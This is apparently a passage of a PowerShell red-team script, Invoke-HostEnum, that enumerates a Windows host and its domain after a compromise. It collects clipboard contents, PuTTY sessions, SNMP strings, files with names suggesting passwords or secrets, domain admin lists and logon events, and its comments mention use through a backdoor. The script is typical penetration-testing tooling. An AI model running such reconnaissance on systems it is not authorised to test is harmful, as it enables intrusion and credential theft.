Function Invoke-HostEnum() {
<#
.SYNOPSIS

	Performs local host and/or domain enumeration for situational awareness

	Author: Andrew Chiles (@andrewchiles) with code by Joe Bialek, rvrsh3ll, Beau Bullock, and Tim Medin
	License: BSD 3-Clause
	Depenencies: None
	Requirements: None
	
	https://github.com/minisllc/red-team-scripts

.DESCRIPTION

	A compilation of multiple system enumeration / situational awareness techniques collected over time. 
	Privilege escalation techniques are not specifically checked - run PowerUp for those.

	If system is a member of a domain, it will perform additional enumeration. However, domain enumeration is significantly limited with the intention that PowerView, BoodHound, etc will be also be used.
	
	Script output is written to disk in the format of YYYYMMDD_HHMMSS_HOSTNAME.html at $Path specified on command line.  

	Invoke-HostEnum is Powershell 2.0 compatible to ensure it will function on the widest variety of Windows targets

	Enumerated Information:
	
	- OS Details, Hostname, Uptime, Installdate
	- Installed Applications and Patches
	- Network Adapter Configuration, Network Shares, Connections, Routing Table, DNS Cache
	- Running Processes and Installed Services
	- Interesting Registry Entries
	- Local Users, Groups, Administrators 
	- Personal Security Product Status
	- Interesting file locations and keyword searches via file indexing
	- Interesting Windows Logs (User logins)
	- Basic Domain enumeration (users, groups, trusts, domain controllers, account policy, SPNs)

.PARAMETER Local

	Executes the local enumeration functions

.PARAMETER Domain

	Executes the domain enumeration functions

.PARAMETER Path

	Specifies the optional directory for file output 

.PARAMETER Verbose

	Enables verbosity (not recommended through a remote agent/backdoor)

.EXAMPLE

	PS C:\> Invoke-HostEnum -Path c:\programdata\ -Local -Verbose

	Performs local system enumeration with verbosity and writes output to the C:\programdata\ directory

.EXAMPLE

	PS C:\> Invoke-HostEnum -Path . -Domain 

	Performs domain enumeration using net commands and saves the output to the current directory

.EXAMPLE

	PS C:\> Invoke-HostEnum -Local -Domain 

	Performs local and domain enumeration functions and outputs the results to the console

.LINK

https://github.com/minisllc/red-team-scripts

#>
	[CmdletBinding(DefaultParameterSetname="Local")] Param(
	    [Parameter(Mandatory = $True, ParameterSetName = "Local")]
	    [Parameter(Mandatory = $False, ParameterSetName = "Domain")]
	    [Switch]$Local,
	    [Parameter(Mandatory = $True, ParameterSetName = "Domain")]
	    [Switch]$Domain,
		[ValidateScript({Test-Path -Path $_ })]
		$Path = $null
	)
	
	# Ignore Errors and don't print to screen unless specified otherwise when calling Functions
	$ErrorActionPreference = "SilentlyContinue"
	
	Function Get-SysInfo {
	<#
	.SYNOPSIS
	
	Gets basic system information from the host
	
	#>

		$os_info = gwmi Win32_OperatingSystem
		$uptime = [datetime]::ParseExact($os_info.LastBootUpTime.SubString(0,14), "yyyyMMddHHmmss", $null)
		$uptime = (Get-Date).Subtract($uptime)
		$uptime = ("{0} Days, {1} Hours, {2} Minutes, {3} Seconds" -f ($uptime.Days, $uptime.Hours, $uptime.Minutes, $uptime.Seconds))
		$Sysinfo = "[+] SYSTEMINFO`n"
		$Sysinfo += "HOSTNAME:    $($ENV:COMPUTERNAME)`n"
		$Sysinfo += "DATE:        $((Get-Date).ToUniversalTime()|Get-Date -uformat  %Y%m%d_%H%M%S)`n"
		$IPAddresses = (@([System.Net.Dns]::GetHostAddresses($ENV:HOSTNAME)) | %{$_.IPAddressToString}) -join ", "
		$Sysinfo += "IPADDRESS:   " + $IPAddresses + "`n"
		$Sysinfo += "OS:          $((gwmi win32_OperatingSystem).caption)`n"
		$Sysinfo += "ARCH:        $($os_info.OSArchitecture)`n"
		$Sysinfo += "UPTIME:      $uptime`n"
		$Sysinfo += "USER:        $($ENV:USERNAME)`n"
		$Sysinfo += "DOMAIN:      $($(GWMI Win32_ComputerSystem).domain)`n"
		$Sysinfo += "LOGONSERVER: $($ENV:LOGONSERVER)`n"
		$Sysinfo += "PSVERSION:   " + $PSVersionTable.PSVersion.ToString() + "`n"
	
		Return $Sysinfo
	}
	
	Function Get-ProcessInfo() {
	<#
	.SYNOPSIS
	
	Gets detailed process information via WMI
	
	#>	
		# Extra work here to include process owner and commandline in table using WMI
		Write-Verbose "Enumerating running processes..."
		$owners = @{}
		$commandline = @{}
		gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
		gwmi win32_process |% {$commandline[$_.handle] = $_.commandline}
		[string] $Output = "`n`n[+] ACTIVE PROCESSES`n"
		$Output += get-process | Sort-Object -property ID | 
		Format-Table ID,Name,@{l="Owner";e={$owners[$_.id.tostring()]}},Path,@{l="CommandLine";e={$commandline[$_.id.tostring()]}},Path -auto |
		Out-String -width 400
		Return $Output
	}
	
	Function Get-LocalCommands() {
	<#
	.SYNOPSIS
	
	Wraps many one-liner commands for enumerating the local system configuration
	 
	#>
		Write-Verbose "Enumerating Local System..."
		[string] $Output = "`n[+] WINDOWS CONFIGURATION`n`n"
		# Systeminfo.exe
		#$Output +="`nSysteminfo.exe:`n" + ((systeminfo)  -join "`r`n")

		# Installed software, check for 64-bit applications
		$Software  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher
		if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -eq "64-bit")
		{
			$Software += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher
		}
		$Output += "`nInstalled Applications:`n" + ($Software | Sort-Object DisplayName -unique |Sort-Object InstallDate -Descending | Format-Table -auto | Out-String -width 300)
		
		# Get patches
		$Output += "`nInstalled Patches:`n" + (Get-WmiObject -class Win32_quickfixengineering |sort|Format-Table -auto HotFixID,InstalledOn,InstalledBy |Out-String -width 300)
		
		# Get environment variables
		$Output +="`nEnvironment Variables:`n" + (Get-Childitem -path env:* | Sort name | Format-Table -auto | Out-String -width 300)
		
		# Get Powershell Version
		$Output +="`nPowershell Version:`n" + ($PSVersionTable | Format-Table -auto | Out-String)
		
		# Get BIOS information
		$Output +="`nBIOS Information:`n" + (Get-WmiObject -Class win32_bios|Format-List| Out-String -width 200)

		# Whoami.exe
		$Output +="`nWhoami /all:`n" + ((whoami.exe /all)  -join "`r`n")
		
		# WMI Physical Computer Information
		$Output +="`n`nComputer Information:`n" + (Get-WmiObject -class Win32_ComputerSystem |Format-List| Out-String -width 200)
		
		# WMI System Drives
		$Output +="`nSystem Drives:`n" + (Get-PSDrive -psprovider filesystem |Format-Table -auto | Out-String -width 200)
		
		# WMI Services
		$Output +="`nInstalled Services:`n" + (Get-WmiObject win32_service | Format-Table Name, DisplayName, State, PathName -auto | Out-String -width 300)
		
		# Local User Accounts
		$Output +="`nLocal users:`n" + (Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'" |sort SID -Descending | Format-Table Name,Caption,SID,Fullname,Disabled,Lockout, Description -auto | Out-String -width 400)
		
		# Local Administrators
		$Output +="`nLocal Administrators:`n" + (Get-WmiObject win32_groupuser | Where-Object { $_.GroupComponent -match 'administrators' -and ($_.GroupComponent -match "Domain=`"$env:COMPUTERNAME`"")} | ForEach-Object {[wmi]$_.PartComponent }  |Format-Table name, caption, fullname, status, lockout, passwordexpires, disabled -wrap |Out-String -width 300)

		# Local Groups
		$Output +="`nLocal Groups:`n" + (Get-WmiObject -Class Win32_Group -Filter "Domain='$($env:ComputerName)'" | Format-Table Name,SID,Description -auto |Out-String -width 400)
		
		# WMI Network Adapters
		$Output +="`nIP Adapters:`n" +(Get-WmiObject -class Win32_NetworkAdapterConfiguration | Sort IPAddress -descending |Format-Table Description,IPAddress,IPSubnet,DefaultIPgateway,MACaddress,DHCPServer,DNSHostname -auto | Out-String -width 300)
		
		# WMI DNS Cache

		$Output +="`nDNS Cache:`n" + (Get-WmiObject -query "Select * from MSFT_DNSClientCache" -Namespace "root\standardcimv2" | Format-Table Entry,Name,Data -auto | Out-String -width 200)
		
		# WMI Network Shares
		$Output +="`nNetwork Shares:`n" + (Get-WmiObject -class Win32_Share |Format-Table -auto | Out-String -width 200)
		
		# WMI Network Connection
		$Output +="`nNetwork Connections:`n" + (Get-WmiObject -class Win32_NetworkConnection |Format-Table -auto | Out-String -width 200)
		
		# WMI Routing Table
		$Output +="`nRouting Table:`n" + (Get-WmiObject -class "Win32_IP4RouteTable" -namespace "root\CIMV2" |Format-Table Destination, Mask, Nexthop, InterfaceIndex, Metric1, Protocol, Type -auto |Out-String -width 200)

		# WMI Net Sessions
		$Output +="`nNet Sessions:`n" + (Get-WmiObject win32_serverconnection |Select ComputerName, UserName, ShareName, NumberofUsers, NumberofFiles, Status, Description, Caption | Sort ActiveTime |FT -auto | Out-String -width 300)
		
		# Typed URLS in Explorer or IE
		$Output +="`nIE Typed URLs:`n" + (Get-ItemProperty "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs" |Out-String -width 300)
		
		# Recently typed "run" commands
		$Output +="`nRecent RUN Commands:`n" + (Get-Itemproperty "HKCU:\software\microsoft\windows\currentversion\explorer\runmru" |Out-String -width 300)

		# HKLM Keys
		$Output +="`nSNMP community strings:`n" + (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" | Format-Table -auto | Out-String -width 200) 
		
		# HKCU Keys 
		$Output +="`nSNMP community strings for current user:`n" + (Get-ItemProperty "HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities"| Format-Table -auto | Out-String -width 200) 
		
		# Putty Save Session Keys
		$Output +="`nPutty saved sessions:`n" + (Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" |Format-Table -auto | Out-String -width 200)
		
		# Clipboard Contents
		Add-Type -Assembly PresentationCore
		$Output += "`nClipboard Contents:`n" + ([Windows.Clipboard]::GetText() -join "`r`n" |Out-String -width 300)	
    	
    	# Remaining binary calls to replace
		$Output +="`nAccount Policy (net accounts):`n" + ((net accounts)  -join "`r`n") 
		$Output +="`nNetstat (netstat -ano):`n" + ((netstat -nao)  -join "`r`n")
		
		Return $Output
	}
	
	Function Get-IndexedFiles {
	<#
	.SYNOPSIS
	
	Uses the Windows indexing service to search for interesting files. This often includes e-mails in clients like Outlook
	Code originally from a Microsoft site, but can no longer locate the exact source
	#>
	param (
	    [Parameter(Mandatory=$true)][string]$Pattern)  

	    if($Path -eq ""){$Path = $PWD;} 

	    $pattern = $pattern -replace "\*", "%"  
	    $path = $path + "\%"

	    $con = New-Object -ComObject ADODB.Connection
	    $rs = New-Object -ComObject ADODB.Recordset

	    # This directory indexing search doesn't work on some systems tested (i.e.Server 2K8r2)
	    # Using Try/Catch to break the search in case the provider isn't available
	    Try {
	    	$con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
	    Catch {
	    	Return "[-] Indexed file search provider not available"
	    }
	    $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)

	    While(-Not $rs.EOF){
	        $rs.Fields.Item("System.ItemPathDisplay").Value
	        $rs.MoveNext()
	    }
	}

	Function Get-InterestingFiles {
	<#
	.SYNOPSIS
	
	Wraps local file enumeration commands
	
	#>
		Write-Verbose "Enumerating interesting files..."
		[string] $Output = "`n[+] INTERESTING FILES`n"
		
		# Get Indexed files containg $searchStrings (Experimental), edit this to desired list of "dirty words"
		$SearchStrings = "*secret*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config"
		$IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
		
		$Output += "`n`nIndexed File Search (confidential, proprietary, pass, credentials, web.config): `n" + ($IndexedFiles |Format-List | Out-String -width 300)
		# Get Top Level file listing of all drives
		$Output +="`nAll FileSystem Drives - Top Level Listing:`n" + (get-psdrive -psprovider filesystem |ForEach-Object {gci $_.Root} | Out-String -width 300)
		
		# Get Program Files
		$Output +="`nSystem Drive - Program Files:`n" + (GCI $ENV:ProgramFiles\ | Format-Table | Out-String -width 300)
		
		# Get Program Files (x86)
		$Output +="`nSystem Drive - Program Files (x86):`n" + (GCI "$ENV:ProgramFiles (x86)\" | Out-String -width 300)
		
		# Get %USERPROFILE%\Desktop top level file listing
		$Output +="`nCurrent User Desktop:`n" + (GCI $ENV:USERPROFILE\Desktop |Out-String -width 300)
		
		# Get %USERPROFILE%\Documents top level file listing
		$Output +="`nCurrent User Documents:`n" + (GCI $ENV:USERPROFILE\Documents |Out-String -width 300)
		
		# Get Files in the %USERPROFILE% directory with certain extensions or phrases
		$Output +="`nCurrent User Profile (pass,diagram,pdf,vsd,doc,docx,xls,xlsx):`n" + (GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx |Format-Table Fullname,LastWriteTime,Length -auto|Out-String -width 300)
		
		# Get User Profile Links
		$Output +="`nCurrent User Profile Links:`n" + (GCI $ENV:USERPROFILE\Links -recurse -include *.lnk | Out-String -width 300)
		
		# Get User Profile Favorites
		$Output +="`nCurrent User Profile Favorites:`n" + (GCI $ENV:USERPROFILE\Favorites -recurse -include *.url -exclude *Windows*,*Microsoft*,*MSN* | Out-String -width 300)
		
		# Get Host File
		$Output +="`nContents of Hostfile:`n" + ((Get-Content -path "$($ENV:WINDIR)\System32\drivers\etc\hosts") -join "`r`n")
		
		Return $Output
	}

	Function Get-RecycleBin {
	<#
	.SYNOPSIS
	
	Gets the contents of the Recycle Bin for the current user
	
	#>	
		Write-Verbose "Enumerating deleted files in Recycle Bin..."
		[string] $Output = "`n[+] RECYCLE BIN FILES`n"
		Try {
			$Shell = New-Object -ComObject Shell.Application
			$Recycler = $Shell.NameSpace(0xa)
			If (($Recycler.Items().Count) -gt 0) {
				$Output += ($Recycler.Items() | Sort ModifyDate -Descending |Format-List Name,Path,ModifyDate,Size,Type | Out-String -width 200)
			}
			Else {
				$Output += "`nNo deleted items found in Recycle Bin!`n"
			}
		}
		Catch {$Output += "`nError getting deleted items from Recycle Bin! $($Error[0])`n"}
		
		Return $Output
	}
	
	Function Get-AVInfo {
	<#
	.SYNOPSIS

		Gets the installed AV product and current status

	#>
		Write-Verbose "Enumerating installed AV product..."
		$Output = "`n[+] AV SOFTWARE STATUS`n"
		$AntiVirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct  -ComputerName $env:computername

		switch ($AntiVirusProduct.productState) { 
		    "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
		    "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
		    "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"} 
		    "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
		    "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
		    "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
		    "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
		    "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"} 
		    "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
		    "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
		    "397568" {$defstatus = "Up to date"; $rtstatus = "Enabled"}
		    "393472" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
		default {$defstatus = "Unknown" ;$rtstatus = "Unknown"} 
		}
		
		# Create hash-table
		$ht = @{}
		$ht.Computername = $env:computername
		$ht.Name = $AntiVirusProduct.displayName
		$ht.'Product GUID' = $AntiVirusProduct.instanceGuid
		$ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe
		$ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe
		$ht.'Definition Status' = $defstatus
		$ht.'Real-time Protection Status' = $rtstatus

		# Convert to PS object and then format as a string for file output
		$Output += (New-Object -TypeName PSObject -Property $ht |Format-List|Out-String -width 200)
		
		# If McAfee is installed then pull some recent logs
		If ($AntiVirusProduct.displayName -like "*mcafee*") {
			$Output += Get-McafeeLogs
		}

		Return $Output
	}

	Function Get-McafeeLogs {
	<#
	.SYNOPSIS

		Searches Application log for "McLogEvent" Provider associated with McAfee AV products and selects the first 50 events from the last 14 days

	#>
		Write-Verbose "Enumerating Mcafee AV events..."
		[string] $Output = "`n[+] MCAFEE AV EVENTS`n"
		# Get events from the last two weeks
		$date = (get-date).AddDays(-14)
		$ProviderName = "McLogEvent"
		# Try to get McAfee AV event logs
		Try {
			$McafeeLogs = Get-WinEvent -FilterHashTable @{ logname = "Application"; StartTime = $date; ProviderName = $ProviderName; }
			$Output += $McafeeLogs |Select -First 50 ID, Providername, DisplayName, TimeCreated, Level, UserID, ProcessID, Message | Format-List | Out-String -width 300
		}
		Catch {
			$Output += "`n[-] Error getting AV event logs! $($Error[0])`n"
		}
		Return $Output
	}
		
	Function Get-DomainInfo(){
	<#
	.SYNOPSIS
	
	Executes some basic domain enumeration commands (users, groups, DCs, trusts)
	
	#>	
		Write-Verbose "Enumerating Domain Info..."
		[string] $Output = "`n[+] WINDOWS DOMAIN ENUMERATION`n"
		$Domain = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()
		
		# Get Domain Admins and Enterprise Admins using code adapted from Dafthack HostRecon.ps1
		Try {
            $DAgroup = ([adsi]"WinNT://$domain/Domain Admins,group")
            $Members = @($DAgroup.psbase.invoke("Members"))
            [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
            $Output += "`nDomain Admins:`n" + $MemberNames

            $EAgroup = ([adsi]"WinNT://$domain/Enterprise Admins,group")
            $Members = @($EAgroup.psbase.invoke("Members"))
            [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
            $Output += "`n`nEnterprise Admins:`n" + $MemberNames
        }
        Catch {
            Write-Verbose " [-] Error connecting to the domain while retrieving group members."    
        }
        # Get Domain Account Policy code from Dafthack HostRecon.ps1
		Try {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
                $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                $CurrentDomain = [ADSI]"WinNT://$env:USERDOMAIN"
                $Name = @{Name="DomainName";Expression={$_.Name}}
	            $MinPassLen = @{Name="Minimum Password Length";Expression={$_.MinPasswordLength}}
                $MinPassAge = @{Name="Minimum Password Age (Days)";Expression={$_.MinPasswordAge.value/86400}}
	            $MaxPassAge = @{Name="Maximum Password Age (Days)";Expression={$_.MaxPasswordAge.value/86400}}
	            $PassHistory = @{Name="Enforce Password History (Passwords remembered)";Expression={$_.PasswordHistoryLength}}
	            $AcctLockoutThreshold = @{Name="Account Lockout Threshold";Expression={$_.MaxBadPasswordsAllowed}}
	            $AcctLockoutDuration =  @{Name="Account Lockout Duration (Minutes)";Expression={if ($_.AutoUnlockInterval.value -eq -1) {'Account is locked out until administrator unlocks it.'} else {$_.AutoUnlockInterval.value/60}}}
	            $ResetAcctLockoutCounter = @{Name="Observation Window";Expression={$_.LockoutObservationInterval.value/60}}
	            $Output += "`n`nDomain Account Policy:`n" + ($CurrentDomain | Select-Object $Name,$MinPassLen,$MinPassAge,$MaxPassAge,$PassHistory,$AcctLockoutThreshold,$AcctLockoutDuration,$ResetAcctLockoutCounter | Format-List | Out-String)

            }
        Catch {
                Write-Verbose "[-] Error connecting to the domain while retrieving password policy."    
            }

		# Get Domain Controllers
		$Output += "`nDomain Controllers:`n" + ($Domain | ForEach-Object {$_.DomainControllers} |Format-Table Name,OSVersion,Domain,IpAddress -auto |Out-String -width 300)

		$Output +="`nDomain Trusts:`n" + ($Domain.GetAllTrustRelationships() |Format-List |Out-String -width 200)
		
		$Output +="`nDomain Users:`n" + (Get-WmiObject -Class Win32_UserAccount | sort SID -Descending | Format-Table Name,Caption,SID,Fullname,Disabled,Lockout,Description -auto | Out-String -width 300)

		$Output +="`nDomain Groups:`n" + (Get-WmiObject -Class Win32_Group | sort SID -Descending | Format-Table Name,SID,Description -auto |Out-String -width 300)

		# Need a good non-binary computer listing function like net groups "Domain Computers" /domain

		Return $Output
       
	}

	# PowerSploit Functions with modifications

	function Get-ComputerDetails {
	<#
	.SYNOPSIS

	This script is used to get useful information from a computer.

	Function: Get-ComputerDetails
	Author: Joe Bialek, Twitter: @JosephBialek
	Required Dependencies: None
	Optional Dependencies: None

	.DESCRIPTION

	This script is used to get useful information from a computer. Currently, the script gets the following information:
	-Explicit Credential Logons (Event ID 4648)
	-Logon events (Event ID 4624)
	-AppLocker logs to find what processes are created
	-PowerShell logs to find PowerShell scripts which have been executed
	-RDP Client Saved Servers, which indicates what servers the user typically RDP's in to

	.PARAMETER ToString

	Switch: Outputs the data as text instead of objects, good if you are using this script through a backdoor.
	    
	.EXAMPLE

	Get-ComputerDetails
	Gets information about the computer and outputs it as PowerShell objects.

	Get-ComputerDetails -ToString
	Gets information about the computer and outputs it as raw text.

	.NOTES
	This script is useful for fingerprinting a server to see who connects to this server (from where), and where users on this server connect to. 
	You can also use it to find Powershell scripts and executables which are typically run, and then use this to backdoor those files.

	.LINK

	Blog: http://clymb3r.wordpress.com/
	Github repo: https://github.com/clymb3r/PowerShell

	#>

	    Param(
	        [Parameter(Position=0)]
	        [Switch]
	        $ToString
	    )
	    Write-Verbose "Enumerating Event Logs for interesting entries (Get-ComputerDetails)..."
	    Write-Output "`n[+] GET-COMPUTERDETAILS`n"

	    # Added Try/Catch to prevent parent from exiting if we don't have rights to read the security log. -EA preferences didn't make a difference.
	    # This was only an issue when executed through Empire
	    Try {
	    	$SecurityLog = Get-EventLog -LogName Security
	    	$Filtered4624 = Find-4624Logons $SecurityLog
	    	$Filtered4648 = Find-4648Logons $SecurityLog
	    }
	    Catch{}
	    
	    $AppLockerLogs = Find-AppLockerLogs
	    $PSLogs = Find-PSScriptsInPSAppLog
	    $RdpClientData = Find-RDPClientConnections

	    if ($ToString)
	    {
	        Write-Output "`nEvent ID 4624 (Logon):"
	        Write-Output $Filtered4624.Values | Format-Table -auto |Out-String -width 300
	        Write-Output "`nEvent ID 4648 (Explicit Credential Logon):"
	        Write-Output $Filtered4648.Values | Format-Table -auto |Out-String -width 300
	        Write-Output "`nAppLocker Process Starts:"
	        Write-Output $AppLockerLogs.Values | Format-List |Out-String 
	        Write-Output "`nPowerShell Script Executions:"
	        Write-Output $PSLogs.Values | Format-List |Out-String
	        Write-Output "`nRDP Client Data:"
	        Write-Output $RdpClientData.Values | Format-List |Out-String 
	    }
	    else
	    {
	        $Properties = @{
	            LogonEvent4624 = $Filtered4624.Values
	            LogonEvent4648 = $Filtered4648.Values
	            AppLockerProcessStart = $AppLockerLogs.Values
	            PowerShellScriptStart = $PSLogs.Values
	            RdpClientData = $RdpClientData.Values
	        }

	        $ReturnObj = New-Object PSObject -Property $Properties
	        return $ReturnObj
	    }
	}


	function Find-4648Logons
	{
	<#
	.SYNOPSIS

	Retrieve the unique 4648 logon events. This will often find cases where a user is using remote desktop to connect to another computer. It will give the 
	the account that RDP was launched with and the account name of the account being used to connect to the remote computer. This is useful
	for identifying normal authenticaiton patterns. Other actions that will trigger this include any runas action.

	Function: Find-4648Logons
	Author: Joe Bialek, Twitter: @JosephBialek
	Required Dependencies: None
	Optional Dependencies: None

	.DESCRIPTION

	Retrieve the unique 4648 logon events. This will often find cases where a user is using remote desktop to connect to another computer. It will give the 
	the account that RDP was launched with and the account name of the account being used to connect to the remote computer. This is useful
	for identifying normal authenticaiton patterns. Other actions that will trigger this include any runas action.

	.EXAMPLE

	Find-4648Logons
	Gets the unique 4648 logon events.

	.NOTES

	.LINK

	Blog: http://clymb3r.wordpress.com/
	Github repo: https://github.com/clymb3r/PowerShell
	#>
	    Param(
	        $SecurityLog
	    )

	    $ExplicitLogons = $SecurityLog | Where {$_.InstanceID -eq 4648}
	    $ReturnInfo = @{}

	    foreach ($ExplicitLogon in $ExplicitLogons)
	    {
	        $Subject = $false
	        $AccountWhosCredsUsed = $false
	        $TargetServer = $false
	        $SourceAccountName = ""
	        $SourceAccountDomain = ""
	        $TargetAccountName = ""
	        $TargetAccountDomain = ""
	        $TargetServer = ""
	        foreach ($line in $ExplicitLogon.Message -split "\r\n")
	        {
	            if ($line -cmatch "^Subject:$")
	            {
	                $Subject = $true
	            }
	            elseif ($line -cmatch "^Account\sWhose\sCredentials\sWere\sUsed:$")
	            {
	                $Subject = $false
	                $AccountWhosCredsUsed = $true
	            }
	            elseif ($line -cmatch "^Target\sServer:")
	            {
	                $AccountWhosCredsUsed = $false
	                $TargetServer = $true
	            }
	            elseif ($Subject -eq $true)
	            {
	                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
	                {
	                    $SourceAccountName = $Matches[1]
	                }
	                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
	                {
	                    $SourceAccountDomain = $Matches[1]
	                }
	            }
	            elseif ($AccountWhosCredsUsed -eq $true)
	            {
	                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
	                {
	                    $TargetAccountName = $Matches[1]
	                }
	                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
	                {
	                    $TargetAccountDomain = $Matches[1]
	                }
	            }
	            elseif ($TargetServer -eq $true)
	            {
	                if ($line -cmatch "\s+Target\sServer\sName:\s+(\S.*)")
	                {
	                    $TargetServer = $Matches[1]
	                }
	            }
	        }

	        #Filter out logins that don't matter
	        if (-not ($TargetAccountName -cmatch "^DWM-.*" -and $TargetAccountDomain -cmatch "^Window\sManager$"))
	        {
	            $Key = $SourceAccountName + $SourceAccountDomain + $TargetAccountName + $TargetAccountDomain + $TargetServer
	            if (-not $ReturnInfo.ContainsKey($Key))
	            {
	                $Properties = @{
	                    LogType = 4648
	                    LogSource = "Security"
	                    SourceAccountName = $SourceAccountName
	                    SourceDomainName = $SourceAccountDomain
	                    TargetAccountName = $TargetAccountName
	                    TargetDomainName = $TargetAccountDomain
	                    TargetServer = $TargetServer
	                    Count = 1
	                    #Times = @($ExplicitLogon.TimeGenerated)
	                }

	                $ResultObj = New-Object PSObject -Property $Properties
	                $ReturnInfo.Add($Key, $ResultObj)
	            }
	            else
	            {
	                $ReturnInfo[$Key].Count++
	                #$ReturnInfo[$Key].Times += ,$ExplicitLogon.TimeGenerated
	            }
	        }
	    }

	    return $ReturnInfo
	}

	function Find-4624Logons
	{
	<#
	.SYNOPSIS

	Find all unique 4624 Logon events to the server. This will tell you who is logging in and how. You can use this to figure out what accounts do
	network logons in to the server, what accounts RDP in, what accounts log in locally, etc...

	Function: Find-4624Logons
	Author: Joe Bialek, Twitter: @JosephBialek
	Required Dependencies: None
	Optional Dependencies: None

	.DESCRIPTION

	Find all unique 4624 Logon events to the server. This will tell you who is logging in and how. You can use this to figure out what accounts do
	network logons in to the server, what accounts RDP in, what accounts log in locally, etc...

	.EXAMPLE

	Find-4624Logons
	Find unique 4624 logon events.

	.NOTES

	.LINK

	Blog: http://clymb3r.wordpress.com/
	Github repo: https://github.com/clymb3r/PowerShell
	#>
	    Param (
	        $SecurityLog
	    )

	    $Logons = $SecurityLog | Where {$_.InstanceID -eq 4624}
	    $ReturnInfo = @{}

	    foreach ($Logon in $Logons)
	    {
	        $SubjectSection = $false
	        $NewLogonSection = $false
	        $NetworkInformationSection = $false
	        $AccountName = ""
	        $AccountDomain = ""
	        $LogonType = ""
	        $NewLogonAccountName = ""
	        $NewLogonAccountDomain = ""
	        $WorkstationName = ""
	        $SourceNetworkAddress = ""
	        $SourcePort = ""

	        foreach ($line in $Logon.Message -Split "\r\n")
	        {
	            if ($line -cmatch "^Subject:$")
	            {
	                $SubjectSection = $true
	            }
	            elseif ($line -cmatch "^Logon\sType:\s+(\S.*)")
	            {
	                $LogonType = $Matches[1]
	            }
	            elseif ($line -cmatch "^New\sLogon:$")
	            {
	                $SubjectSection = $false
	                $NewLogonSection = $true
	            }
	            elseif ($line -cmatch "^Network\sInformation:$")
	            {
	                $NewLogonSection = $false
	                $NetworkInformationSection = $true
	            }
	            elseif ($SubjectSection)
	            {
	                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
	                {
	                    $AccountName = $Matches[1]
	                }
	                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
	                {
	                    $AccountDomain = $Matches[1]
	                }
	            }
	            elseif ($NewLogonSection)
	            {
	                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
	                {
	                    $NewLogonAccountName = $Matches[1]
	                }
	                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
	                {
	                    $NewLogonAccountDomain = $Matches[1]
	                }
	            }
	            elseif ($NetworkInformationSection)
	            {
	                if ($line -cmatch "^\s+Workstation\sName:\s+(\S.*)")
	                {
	                    $WorkstationName = $Matches[1]
	                }
	                elseif ($line -cmatch "^\s+Source\sNetwork\sAddress:\s+(\S.*)")
	                {
	                    $SourceNetworkAddress = $Matches[1]
	                }
	                elseif ($line -cmatch "^\s+Source\sPort:\s+(\S.*)")
	                {
	                    $SourcePort = $Matches[1]
	                }
	            }
	        }

	        #Filter out logins that don't matter
	        if (-not ($NewLogonAccountDomain -cmatch "NT\sAUTHORITY" -or $NewLogonAccountDomain -cmatch "Window\sManager"))
	        {
	            $Key = $AccountName + $AccountDomain + $NewLogonAccountName + $NewLogonAccountDomain + $LogonType + $WorkstationName + $SourceNetworkAddress + $SourcePort
	            if (-not $ReturnInfo.ContainsKey($Key))
	            {
	                $Properties = @{
	                    LogType = 4624
	                    LogSource = "Security"
	                    SourceAccountName = $AccountName
	                    SourceDomainName = $AccountDomain
	                    NewLogonAccountName = $NewLogonAccountName
	                    NewLogonAccountDomain = $NewLogonAccountDomain
	                    LogonType = $LogonType
	                    WorkstationName = $WorkstationName
	                    SourceNetworkAddress = $SourceNetworkAddress
	                    SourcePort = $SourcePort
	                    Count = 1
	                    #Times = @($Logon.TimeGenerated)
	                }

	                $ResultObj = New-Object PSObject -Property $Properties
